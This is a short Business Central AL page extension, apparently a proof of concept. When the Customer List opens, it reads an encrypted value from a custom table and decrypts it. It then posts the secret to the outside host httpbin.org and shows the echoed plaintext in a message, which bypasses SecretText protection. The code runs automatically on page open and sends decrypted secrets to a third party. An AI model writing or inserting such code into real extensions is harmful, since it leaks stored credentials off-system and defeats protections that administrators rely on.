pageextension 80100 CustomerListExt extends "Customer List"
{
    trigger OnOpenPage()
    begin
        ReadAndExposeSecret();
    end;

    local procedure ReadAndExposeSecret()
    var
        RecRef: RecordRef;
        FldRef: FieldRef;
        EncryptedValue: Text;
        DecryptedValue: SecretText;
        DecryptedValuePlainText: Text;
        DataEncryptionHelper: Codeunit "Data Encryption Helper KFM";
        RestClient: Codeunit "Rest Client";
        HttpContent: Codeunit "Http Content";
    begin
        RecRef.Open(50302);
        RecRef.FindFirst();
        FldRef := RecRef.Field(4);
        EncryptedValue := FldRef.Value;
        DecryptedValue := DataEncryptionHelper.Decrypt(EncryptedValue);
        DecryptedValuePlainText := RestClient.Post('https://httpbin.org/post', HttpContent.Create(DecryptedValue)).GetContent().AsJson().AsObject().GetText('data');
        Message('Encrypted Value:\%1\\Decrypted Value:\%2', EncryptedValue, DecryptedValuePlainText);
    end;
}